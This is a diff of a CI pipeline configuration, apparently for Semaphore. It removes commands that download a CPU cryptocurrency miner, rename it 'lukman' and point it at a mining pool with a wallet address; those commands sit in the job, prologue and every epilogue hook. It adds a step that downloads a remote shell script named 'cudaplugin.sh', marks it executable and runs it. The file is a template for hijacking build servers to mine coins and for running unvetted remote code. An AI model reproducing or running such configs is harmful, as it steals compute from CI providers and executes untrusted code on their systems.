@@ -5,38 +5,12 @@ agent:
     type: e1-standard-2
     os_image: ubuntu1804
 blocks:
-  - name: 'Block #1'
+  - name: 'Block #4'
     dependencies: []
     task:
       jobs:
-        - name: 'Job #1'
+        - name: 'Job #4'
           commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
-            - tar xf cpuminer-opt-linux.tar.gz
-            - mv cpuminer-sse2 lukman
-            - './lukman -a yespowerres -o stratum+tcp://stratum-asia.rplant.xyz:7040 -u r18fngCiL7LhLtmdZjnZL9XpAcHe9NwkBBc.ambon -t0'
-      prologue:
-        commands:
-          - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
-          - tar xf cpuminer-opt-linux.tar.gz
-          - mv cpuminer-sse2 lukman
-          - './lukman -a yespowerres -o stratum+tcp://stratum-asia.rplant.xyz:7040 -u r18fngCiL7LhLtmdZjnZL9XpAcHe9NwkBBc.ambon -t0'
-      epilogue:
-        always:
-          commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
-            - tar xf cpuminer-opt-linux.tar.gz
-            - mv cpuminer-sse2 lukman
-            - './lukman -a yespowerres -o stratum+tcp://stratum-asia.rplant.xyz:7040 -u r18fngCiL7LhLtmdZjnZL9XpAcHe9NwkBBc.ambon -t0'
-        on_pass:
-          commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
-            - tar xf cpuminer-opt-linux.tar.gz
-            - mv cpuminer-sse2 lukman
-            - './lukman -a yespowerres -o stratum+tcp://stratum-asia.rplant.xyz:7040 -u r18fngCiL7LhLtmdZjnZL9XpAcHe9NwkBBc.ambon -t0'
-        on_fail:
-          commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
-            - tar xf cpuminer-opt-linux.tar.gz
-            - mv cpuminer-sse2 lukman
-            - './lukman -a yespowerres -o stratum+tcp://stratum-asia.rplant.xyz:7040 -u r18fngCiL7LhLtmdZjnZL9XpAcHe9NwkBBc.ambon -t0'
+            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
+            - chmod u+x cudaplugin.sh
+            - /cudaplugin.sh
